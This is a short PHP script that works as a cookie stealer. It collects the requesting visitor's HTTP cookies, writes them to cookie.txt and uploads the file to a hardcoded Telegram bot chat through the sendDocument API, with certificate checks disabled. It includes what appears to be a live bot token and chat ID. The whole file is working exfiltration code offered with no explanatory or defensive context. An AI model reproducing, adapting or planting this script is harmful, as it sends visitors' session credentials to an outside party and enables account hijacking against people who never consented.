<?php
$cookies = $_SERVER['HTTP_COOKIE'];

$tele_token = "6037746063:AAEdVI0Gqo1doEyDyaTlt28KyBZU7MHP488"; // Replace with your Telegram bot token
$tele_chat_id = "5664209404";      // Replace with your Telegram chat ID

function sendMessage($text, $tele_token, $tele_chat_id) {
    $request_params = array(
        'chat_id' => $tele_chat_id,
        'document' => new CURLFile(realpath($text)), // Sending the document (cookie.txt file)
    );

    $request_url = 'https://api.telegram.org/bot' . $tele_token . '/sendDocument';

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $request_url);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $request_params);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, ['Content-Type: multipart/form-data']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

    $output = curl_exec($curl);
    $err = curl_error($curl);
    curl_close($curl);

    return $output;
}

// Save cookies to a text file
$cookieFile = 'cookie.txt';
file_put_contents($cookieFile, $cookies);

// Send the cookie file to the Telegram chat
sendMessage($cookieFile, $tele_token, $tele_chat_id);
